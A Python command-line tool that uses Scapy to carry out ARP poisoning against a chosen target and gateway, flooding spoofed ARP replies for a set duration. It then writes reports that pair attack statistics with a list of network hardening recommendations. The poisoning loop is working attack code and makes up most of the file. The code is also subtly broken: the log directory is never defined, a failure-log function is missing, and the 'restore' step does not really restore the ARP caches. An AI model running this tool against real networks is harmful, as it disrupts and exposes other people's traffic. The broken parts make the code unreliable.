#!/usr/bin/env python3
# ARP Poison (Denial of Service) + Reporting and Security Recommendations

import os
import sys
import time
import json
import signal
import threading
import xml.etree.ElementTree as ET
from datetime import datetime
from scapy.all import ARP, send
from reportlab.lib import colors
from reportlab.lib.pagesizes import letter
from reportlab.platypus import SimpleDocTemplate, Table, TableStyle, Paragraph, Spacer
from reportlab.lib.styles import getSampleStyleSheet

# ANSI color codes
RED = "\033[38;2;255;0;0m"
GREEN = "\033[38;2;0;255;0m"
RESET = "\033[0m"
BOLD = "\033[1m"

# Security recommendations specific to ARP Poison
RECOMMENDATIONS = [
    {"id": 1, "title": "Dynamic ARP Inspection (DAI)", "severity": "High",
     "description": "Validate ARP packets on untrusted ports and drop invalid responses.",
     "metrics": {"rate_limit_pps": 15, "detection_success": "100%"},
     "sources": ["Cisco DAI guide", "Academic ARP spoofing study"]},
    {"id": 2, "title": "Port Security", "severity": "Medium",
     "description": "Restrict MAC addresses per port and define violation actions.",
     "metrics": {"max_mac": 1, "violations": "shutdown/restrict/protect"},
     "sources": ["Cisco Port Security", "ServerMania MAC Filtering"]},
    {"id": 3, "title": "DHCP Snooping", "severity": "Medium",
     "description": "Build DHCP binding table to drop rogue DHCP messages.",
     "metrics": {"binding_size": "client count", "drop_rate": "config-dependent"},
     "sources": ["DHCP Snooping RFC", "ManageEngine rogue DHCP"]},
    {"id": 4, "title": "VLAN Segmentation", "severity": "Low",
     "description": "Isolate critical assets in VLANs to limit poisoning impact.",
     "metrics": {"vlans": "count", "isolation_ratio": "percentage"},
     "sources": ["NIST SP800-125", "IEEE VLAN study"]}
]

# Directory for logs\LOG_DIR = os.path.expanduser("/var/log/purpleshivatoolslog")
os.makedirs(LOG_DIR, exist_ok=True)

# Attack state
stop_attack = False
packets_sent = 0
errors_count = 0
stdout_lock = threading.Lock()

# Ensure running as root
if os.geteuid() != 0:
    print(f"{RED}[!] Warning: Run as root for accurate ARP operations.{RESET}")

# Signal handler
def _signal_handler(sig, frame):
    global stop_attack
    print(f"\n{RED}[!] Interrupted. Stopping attack.{RESET}")
    stop_attack = True
    sys.exit(1)

signal.signal(signal.SIGINT, _signal_handler)

# Display real-time stats
def update_stats(start_time):
    while not stop_attack:
        elapsed = int(time.time() - start_time)
        with stdout_lock:
            sys.stdout.write(f"\rPackets Sent: {packets_sent} | Errors: {errors_count} | Elapsed: {elapsed}s")
            sys.stdout.flush()
        time.sleep(1)
    print()

# ARP poison thread
def arp_poison(target, gateway):
    global packets_sent, errors_count
    while not stop_attack:
        try:
            send(ARP(op=2, pdst=target, psrc=gateway), verbose=0)
            send(ARP(op=2, pdst=gateway, psrc=target), verbose=0)
            packets_sent += 2
            time.sleep(0.01)
        except Exception:
            errors_count += 1
            time.sleep(1)

# Restore correct ARP entries
def restore_network(target, gateway):
    send(ARP(op=2, pdst=gateway, psrc=target, hwdst="ff:ff:ff:ff:ff:ff"), count=3, verbose=0)
    send(ARP(op=2, pdst=target, psrc=gateway, hwdst="ff:ff:ff:ff:ff:ff"), count=3, verbose=0)
    print(f"{GREEN}[+] Network restored.{RESET}")

# Logging functions
def write_xml_log(path, target, gateway, sent, errors, duration):
    root = ET.Element("ARPPoisonLog")
    ET.SubElement(root, "Timestamp").text = datetime.now().isoformat()
    ET.SubElement(root, "Target").text = target
    ET.SubElement(root, "Gateway").text = gateway
    ET.SubElement(root, "PacketsSent").text = str(sent)
    ET.SubElement(root, "Errors").text = str(errors)
    ET.SubElement(root, "Duration").text = str(duration)
    recs = ET.SubElement(root, "SecurityRecommendations")
    for rec in RECOMMENDATIONS:
        r = ET.SubElement(recs, "Recommendation")
        ET.SubElement(r, "ID").text = str(rec["id"])
        ET.SubElement(r, "Title").text = rec["title"]
        ET.SubElement(r, "Severity").text = rec["severity"]
        ET.SubElement(r, "Description").text = rec["description"]
    tree = ET.ElementTree(root)
    tree.write(path, encoding="utf-8", xml_declaration=True)
    print(f"{BOLD}[XML log]{RESET} {path}")

def write_json_log(path, target, gateway, sent, errors, duration):
    data = {
        "timestamp": datetime.now().isoformat(),
        "target": target,
        "gateway": gateway,
        "packets_sent": sent,
        "errors": errors,
        "duration": duration,
        "security_recommendations": RECOMMENDATIONS
    }
    with open(path, 'w') as f:
        json.dump(data, f, indent=4)
    print(f"{BOLD}[JSON log]{RESET} {path}")

# Updated PDF log to match ARP Scan format

def write_pdf_log(path, target, gateway, sent, errors, duration):
    doc = SimpleDocTemplate(path, pagesize=letter)
    styles = getSampleStyleSheet()
    elems = []

    # Title and date
    elems.append(Paragraph("ARP Poison Report", styles['Title']))
    elems.append(Spacer(1, 12))
    elems.append(Paragraph(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", styles['Normal']))
    elems.append(Spacer(1, 12))

    # Summary
    for label, val in [
        ("Target", target), ("Gateway", gateway),
        ("Packets Sent", sent), ("Errors", errors),
        ("Duration (s)", duration)
    ]:
        elems.append(Paragraph(f"{label}: {val}", styles['Normal']))
    elems.append(Spacer(1, 20))

    # Security recommendations
    elems.append(Paragraph("Security Recommendations", styles['Heading2']))
    for rec in RECOMMENDATIONS:
        elems.append(Paragraph(f"<b>{rec['title']} (Severity: {rec['severity']})</b>", styles['BodyText']))
        elems.append(Paragraph(rec['description'], styles['BodyText']))
        metrics = "<br/>".join([f"- {k}: {v}" for k, v in rec['metrics'].items()])
        elems.append(Paragraph(f"<i>Metrics:</i><br/>{metrics}", styles['BodyText']))
        sources = "<br/>".join([f"- {s}" for s in rec['sources']])
        elems.append(Paragraph(f"<i>Sources:</i><br/>{sources}", styles['BodyText']))
        elems.append(Spacer(1, 12))

    doc.build(elems)
    print(f"{BOLD}[PDF log]{RESET} {path}")

# Main attack runner with validation
def start_attack(target, gateway, duration, fmt=None):
    global stop_attack, packets_sent, errors_count
    stop_attack = False
    packets_sent = 0
    errors_count = 0
    start_time = time.time()

    try:
        print(f"{BOLD}[*] Starting ARP poison:{RESET} target={target}, gateway={gateway}, duration={duration}s")
        stats_th = threading.Thread(target=update_stats, args=(start_time,), daemon=True)
        stats_th.start()
        poison_th = threading.Thread(target=arp_poison, args=(target, gateway), daemon=True)
        poison_th.start()

        time.sleep(duration)

    except Exception as e:
        stop_attack = True
        restore_network(target, gateway)
        ts = datetime.now().strftime('%Y%m%d_%H%M%S')
        fail_path = os.path.join(LOG_DIR, f"arppoison_failure_{ts}.json")
        write_failure_log(fail_path, target, gateway, e)
        print(f"{RED}[!] Attack failed due to error: {e}{RESET}")
        return

    # Normal completion
    stop_attack = True
    poison_th.join()
    restore_network(target, gateway)
    total = int(time.time() - start_time)
    print(f"{GREEN}[+] Attack complete:{RESET} Sent={packets_sent}, Errors={errors_count}, Duration={total}s")

    if fmt:
        ts = datetime.now().strftime('%Y%m%d_%H%M%S')
        path = os.path.join(LOG_DIR, f"arppoison_{ts}.{fmt}")
        if fmt == 'xml': write_xml_log(path, target, gateway, packets_sent, errors_count, total)
        if fmt == 'json': write_json_log(path, target, gateway, packets_sent, errors_count, total)
        if fmt == 'pdf': write_pdf_log(path, target, gateway, packets_sent, errors_count, total)

# Interactive menu and CLI remain unchanged except catching errors similarly
def interactive_menu():
    while True:
        target = input(f"\n{RED}Target IP (or 'q' to quit):{RESET} ").strip()
        if target.lower() in ['q', 'quit', 'exit']:
            print("Exiting.")
            break
        gateway = input(f"{RED}Gateway IP:{RESET} ").strip()
        try:
            duration = int(input(f"{RED}Duration seconds [30]:{RESET} ").strip() or "30")
        except ValueError:
            duration = 30
        fmt = input("Save report as (xml/json/pdf or skip): ").strip().lower()
        fmt = fmt if fmt in ['xml','json','pdf'] else None
        try:
            start_attack(target, gateway, duration, fmt)
        except Exception as e:
            print(f"{RED}[!] Unexpected error: {e}{RESET}")
        if input("\nScan another? (y/n): ").strip().lower() != 'y':
            break

# CLI entry
def main():
    import argparse
    parser = argparse.ArgumentParser(description="ARP Poison Tool with Reporting")
    parser.add_argument("-t", "--target", help="Target IP")
    parser.add_argument("-g", "--gateway", help="Gateway IP")
    parser.add_argument("-d", "--duration", type=int, default=30, help="Duration in seconds")
    parser.add_argument("-f", "--format", choices=['xml','json','pdf'], help="Report format")
    args = parser.parse_args()

    if args.target and args.gateway:
        start_attack(args.target, args.gateway, args.duration, args.format)
    else:
        interactive_menu()

if __name__ == '__main__':
    main()